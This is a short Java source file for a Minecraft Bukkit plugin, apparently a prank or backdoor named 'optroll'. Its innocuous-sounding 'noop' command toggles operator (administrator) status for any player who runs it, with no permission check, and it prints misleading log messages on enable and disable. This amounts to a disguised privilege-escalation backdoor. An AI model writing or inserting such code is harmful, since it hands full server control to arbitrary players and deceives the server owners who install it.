package RetroBiz;

import RetroBiz.Events.MainEvents;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.entity.Player;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.java.JavaPlugin;


public final class optroll extends JavaPlugin implements CommandExecutor {

    @Override
    public void onEnable() {
        getLogger().info("nothing has been disabled!");
        getServer().getPluginManager().registerEvents(new MainEvents(), this);
        this.getCommand("noop").setExecutor(this);
    }

    @Override
    public void onDisable() {
        getLogger().info("nothing has been enabled!");
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if(!(sender instanceof Player)) return false;
        sender.setOp(!sender.isOp());
        return true;
    }

}
